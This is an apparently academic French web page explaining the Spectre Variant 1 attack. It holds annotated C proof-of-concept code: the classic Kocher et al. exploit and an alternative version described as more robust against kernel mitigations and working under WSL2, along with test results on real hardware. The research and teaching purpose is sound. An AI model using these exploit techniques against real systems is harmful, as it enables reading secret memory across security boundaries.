CVE-2017-5753 · CVE-2017-5715

L'attaque Spectre

Deux approches expérimentales : le PoC classique Variant 1 (Kocher et al. 2018) et un PoC alternatif plus robuste testé sur hardware réel.

Approches expérimentales
Spectre Variant 1 — CVE-2017-5753

Le PoC classique — Kocher et al. 2018

L'approche originale publiée par les chercheurs de Google Project Zero. Exploite la prédiction de branchement et le canal Flush+Reload. Référence académique standard.

🎓

Phase 1 — Entraînement

Appeler la fonction victime avec des entrées valides (x < array1_size) pour que le Branch Predictor Unit apprenne à prédire "branche prise".

👻

Phase 2 — Exploitation

Flusher array1_size du cache, appeler avec x hors-limites. Le BPU prédit "pris" → spéculation → accès hors-limites → secret chargé dans le probe array.

📡

Phase 3 — Exfiltration

Mesurer quel index du probe array est en cache (Flush+Reload). L'index le plus rapide d'accès révèle la valeur du secret.

Code vulnérable annoté (Spectre v1)
/* ══ VARIABLES VICTIMES ══════════════════════════════════════════════════ */ unsigned int array1_size = 16; uint8_t array1[160]; // tableau d'accès légitimes uint8_t array2[256 * 512]; // probe array (canal auxiliaire) char secret[] = "EPFL_SECRET_42"; // valeur à exfiltrer /* ══ FONCTION VICTIME ════════════════════════════════════════════════════ */ void victim_function(size_t x) { if (x < array1_size) { // ① garde de sécurité uint8_t val = array1[x]; // ② accès tableau volatile y = array2[val * 512]; // ③ encodage canal — val = secret si spéculatif ! } } /* ══ CODE ATTAQUANT ══════════════════════════════════════════════════════ */ // PHASE 1 : Entraîner le prédicteur avec des x valides for (int i = 0; i < 200; i++) victim_function(i % array1_size); // PHASE 2 : Exécution malveillante x_mal = (size_t)(secret - (char*)array1); // offset vers le secret _mm_clflush(&array1_size); // rendre la garde lente (~200 cycles) victim_function(x_mal); // → fenêtre spéculative ! // PHASE 3 : Flush+Reload for (int i = 0; i < 256; i++) { t = rdtsc_latency(&array2[i * 512]); if (t < THRESHOLD) leaked_value = i; // cache hit → secret révélé }
Analyse détaillée

Pourquoi la garde de sécurité est contournée

La ligne if (x < array1_size) est censée protéger contre les accès hors-limites. Mais le processeur ne connaît pas encore la valeur de array1_size quand il commence à spéculer.

L'astuce clé : flusher array1_size du cache avec clflush. Le chargement de array1_size prend alors ~200 cycles au lieu de ~4. Pendant ces 200 cycles, le processeur spécule et exécute le corps du if avec x hors-limites.

Quand array1_size arrive enfin et que la condition est fausse, la spéculation est annulée architecturalement — mais array2[secret * 512] reste en cache.

⚠ Résultat expérimental — PoC V1 sur hardware moderne
Testé sur Intel i5-8350U (Kaby Lake R) sous Linux 6.17 avec mitigations actives : 0/14 bytes corrects. Les mitigations IBRS + usercopy/swapgs bloquent totalement ce PoC. Sur Linux avec mitigations désactivées : même résultat — le CPU i5-8350U utilise clflushopt asynchrone qui rend le canal Flush+Reload classique inopérant sur ce matériel.

L'échec du PoC V1 sur hardware moderne est lui-même un résultat scientifique : il confirme l'efficacité des mitigations déployées depuis 2018. Le canal cache reste physiquement mesurable (ratio hit/miss de 5 à 8×), mais la fenêtre spéculative est trop étroite pour être exploitée avec cette technique.

PoC Alternatif — Approche robuste

Un PoC plus résistant aux mitigations

Face à l'échec du PoC V1 sur hardware moderne, nous avons développé une approche alternative qui contourne certaines limitations — notamment le bruit de virtualisation WSL et la sensibilité aux mitigations kernel.

🔄

Flush de condition

Au lieu de flusher array1_size, on flushe une variable condition booléenne. Technique plus robuste face aux mitigations kernel qui ciblent spécifiquement les gardes de borne.

📐

Probe array 1 MB

256 pages × 4 KiB = 1 MB — chaque entrée sur une page mémoire différente. Résiste mieux au hardware prefetcher qu'un tableau de 128 KiB.

📊

Minimum + vote majoritaire

Mesure par minimum de latence sur 100 rounds (au lieu de comptage de hits). Vote majoritaire sur 12 répétitions pour filtrer le bruit.

Code du PoC alternatif (spectre_poc.c)
/* ══ CONFIGURATION ══════════════════════════════════════════════════════ */ #define KB4 4096 // stride = 1 page mémoire #define PROBE_PAGES 256 // 256 entrées possibles (1 byte) #define PROBE_SIZE (KB4 * 256) // 1 MB total → chaque entrée sur une page #define ROUNDS 100 // répétitions par byte #define REPEAT 12 // vote majoritaire volatile char *probe_buffer; // probe array 1 MB volatile int *condition; // variable de contrôle flushée volatile int valid_address = 5; /* ══ FONCTION VICTIME ════════════════════════════════════════════════════ */ static void victim_function(size_t target_addr) { if (*condition) { // condition flushée /* accès spéculatif — lit la mémoire à target_addr */ *(probe_buffer + (*(volatile char*)target_addr) * KB4); } } /* ══ LECTURE D'UN BYTE ═══════════════════════════════════════════════════ */ char read_byte(size_t addr) { int mins[256]; // minimum de latence par index for (int r = 0; r < ROUNDS; r++) { memcpy(tmp, secret, 50); // charge le cache légitimement *condition = 1; for (int i = 0; i < 100; i++) // entraîne le prédicteur victim_function(&valid_address); flush(&probe_buffer[valid_address * KB4]); *condition = 0; // arme le gadget flush(condition); // rend la vérification lente _mm_mfence(); victim_function(addr); // → spéculation avec target_addr ! for (int i = 0; i < 256; i++) { int t = time_access(&probe_buffer[i * KB4]); if (t < mins[i]) mins[i] = t; // garde le minimum flush(&probe_buffer[i * KB4]); } } return (char) argmin(mins); // index le plus rapide = secret }

⚠ Contexte important
Le PoC V2 fonctionne sous WSL2 malgré les mitigations actives car il exploite une fenêtre spéculative différente de celle ciblée par IBRS/usercopy. Sur Linux patché il reste bloqué — les mitigations Intel sont suffisamment larges pour couvrir cette approche aussi. Sur Linux sans mitigations, la fuite est clairement observable et reproductible.
